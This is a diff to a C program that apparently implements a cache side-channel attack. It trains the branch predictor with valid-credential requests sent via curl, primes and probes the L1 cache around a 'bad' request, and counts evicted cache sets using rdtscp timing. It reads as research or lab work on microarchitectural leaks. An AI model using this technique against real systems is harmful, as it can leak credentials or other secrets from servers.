@@ -20,26 +20,37 @@
 
 int probe_array[PROBE_ARR_SIZE]; // allocates int array of size = L1_SIZE
 int main() {
+    int count[SETS] = {0};
     curl_global_init(CURL_GLOBAL_ALL);
-
-    // Train BP
-    for(int i = 0; i < TRAINING_REPS; i++){
-            valid_request(); // send valid credentials
+    int loops = 100;
+    while (loops > 0){
+        // Train BP
+        for(int i = 0; i < TRAINING_REPS; i++){
+                valid_request(); // send valid credentials
+            }
+        
+        // Prime L1 cache
+        // just need to hit each cache line once (so will skip indexes on the same line)
+        for (int j = 0; j < 5; j++){
+            // loop through probe array - one iteration = one cache line hit (makes sure it persists in L1)
+            for (unsigned int i = 0; i < PROBE_ARR_SIZE; i+=INDEXES_PER_LINE){
+                probe_array[i] = 0; 
+            }
         }
-    
-    // Prime L1 cache
-    // just need to hit each cache line once (so will skip indexes on the same line)
-    for (int j = 0; j < 1000; j++){
-        // loop through probe array - one iteration = one cache line hit (makes sure it persists in L1)
-        for (unsigned int i = 0; i < PROBE_ARR_SIZE; i+=INDEXES_PER_LINE){
-            probe_array[i] = 0; 
+        
+        _mm_mfence(); // wait for prime to compelte before sending bad request
+        // cache check 
+        bad_request();
+        _mm_mfence();
+
+        check_cache_presence(count);
+        loops --;
+    }
+    for (int i = 0; i < SETS; i ++){
+        if (count[i] > 0){
+            printf("Set %d: %d\n", i, count[i]);
         }
     }
-    
-    // cache check 
-    bad_request();
-    check_cache_presence();
-    
     return 0;
 }
 
@@ -77,27 +88,32 @@ void bad_request(){
     }
 }
 
-void check_cache_presence(){
+void check_cache_presence(int *count){
     int present = 0;
     uint64_t t1, t2;
     unsigned int pid;
-    int missedIndex[100]  ={0, 0};
-    int x = 0;
     for (unsigned int i = 0; i < PROBE_ARR_SIZE; i+=INDEXES_PER_LINE){
+            _mm_lfence();
             t1 = __rdtscp(&pid);
+            _mm_lfence();
+
             probe_array[i] = 0;
+
+            _mm_lfence();
             t2 = __rdtscp(&pid);
-            if (t2 - t1 < 50){
+            _mm_lfence();
+            
+            if (t2 - t1 < 100){
                 present ++;
                 
             }
             else{
-                missedIndex[x] = present/8;
-                x++;
+                int set_index = (i / INDEXES_PER_LINE) % SETS;
+                count[set_index]++;
             }
         }
     
-    printf("%d/%d cache hits\n Missed Sets: %d & %d\n", present, NO_LINES, missedIndex[0], missedIndex[1]);
+    printf("%d/%d cache hits\n", present, NO_LINES);
 }
 
 void cache_Measurement(){
